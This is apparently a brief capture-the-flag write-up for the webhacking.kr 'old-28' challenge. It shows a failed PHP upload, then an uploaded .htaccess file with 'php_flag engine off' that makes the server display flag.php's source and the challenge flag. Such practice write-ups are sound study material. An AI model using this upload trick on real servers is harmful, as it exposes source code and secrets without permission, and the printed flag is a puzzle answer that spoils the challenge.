# Old 28    .Htaccess

URL: [http://webhacking.kr:10002](http://webhacking.kr:10002)

![old-28.png](/assets/ctf/webhacking.kr/old-28.png)

I first tried to upload basic php script:
```php
<?php echo phpinfo(); ?>
```

But after upload file became:
```php
?php echo phpinfo(); ?>
```

![old-28-1.png](/assets/ctf/webhacking.kr/old-28-1.png)

The server is Apache, so we can upload `.htaccess` file and disable PHP rendering to read the `flag.php`

```ini
php_flag engine off
```

![old-28-2.png](/assets/ctf/webhacking.kr/old-28-2.png)

```php
<?php
  $flag="FLAG{easy_peasy_apachy}";
?>
```